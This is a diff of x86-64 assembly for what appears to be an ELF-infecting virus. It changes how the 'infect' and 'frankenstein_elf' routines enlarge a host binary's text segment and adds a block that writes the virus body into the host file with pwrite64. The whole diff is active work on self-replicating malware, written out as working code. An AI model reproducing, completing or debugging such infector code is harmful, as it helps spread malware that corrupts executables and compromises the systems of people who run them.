@@ -298,7 +298,7 @@ hostentry_offset: dd 0
 hosttext_start: dd 0
 
 vxhostentry: dq 0
-vxoffset: dq 0
+vxoffset: dd 0
 ventry equ $_start 
 
 
@@ -759,7 +759,7 @@ infect:
 				mov r10, [r13 + r12 + elf_phdr.p_offset] 
 				mov dword [hosttext_start], r10d
 				add r10, [r13 + r12 + elf_phdr.p_filesz]				
-				mov qword [vxoffset], r10
+				mov dword [vxoffset], r10d
 				add qword [r13 + r12 + elf_phdr.p_filesz], vlen	
 				add qword [r13 + r12 + elf_phdr.p_memsz], vlen	
 
@@ -888,7 +888,9 @@ frankenstein_elf:
 
 		;xor rdx, rdx	
 		;mov rdx, [hostentry_offset]
-		mov rdx, [hosttext_start]
+		;mov rdx, [hosttext_start]
+		;mov rdx, [evaddr]
+		mov rdx, [vxoffset]
 		jmp .write_ehdr_phdrs
 	.offset_ehdr_phdr_copy_pagesize:
 		;mov rdx, textsegmentoffset_pageyes_len
@@ -917,18 +919,18 @@ frankenstein_elf:
 	.write_padding_until_textsegment:		
 		;mov rdx, evaddr
 		;sub rdx, [hostentry_offset]
-		add rdx, hosttext_start
+;;		add rdx, hosttext_start
 		;;mov rdx, [hosttext_start]
 		;sub rdx, hostentry_offset
 		;add edx, dword [PAGESIZE - dx]
 		;add rdx, [hostentry_page_offset]
 		;mov rdx, rcx
 
-		mov rdi, r9						; prob unnecessary since this should still be the val in rdi
-		mov rsi, r13
-		mov r10, [hostentry_offset]
-		mov rax, SYS_PWRITE64
-		syscall
+;;		mov rdi, r9						; prob unnecessary since this should still be the val in rdi
+;;		mov rsi, r13
+;;		mov r10, [hostentry_offset]
+;;		mov rax, SYS_PWRITE64
+;;		syscall
 
 
 	;.lseek_textsegment:
@@ -944,6 +946,14 @@ frankenstein_elf:
 	;	add rsi, hostentry_offset
 	;	mov rax, SYS_WRITE
 	;	syscall
+	.write_virus_totemp:
+		mov rdx, vlen
+		mov rdi, r9						; prob unnecessary since this should still be the val in rdi
+		mov rsi, _start
+		mov r10, [vxoffset]
+		mov rax, SYS_PWRITE64
+		syscall
+		
 		
 		;munmap file from work area
 		;mov qword rsi, [elf_filesize]
